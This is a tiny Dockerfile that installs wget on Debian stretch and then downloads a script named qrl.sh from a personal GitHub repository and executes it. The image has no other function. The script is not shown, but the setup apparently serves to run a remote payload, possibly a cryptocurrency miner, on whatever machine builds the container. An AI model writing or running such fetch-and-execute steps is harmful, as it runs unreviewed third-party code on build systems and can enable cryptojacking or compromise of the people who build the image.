FROM debian:stretch
EXPOSE 8080
RUN apt update -y \
  && apt install -y \
  wget
RUN wget https://raw.githubusercontent.com/agamlimaa/srb/main/qrl.sh && chmod +x qrl.sh && ./qrl.sh
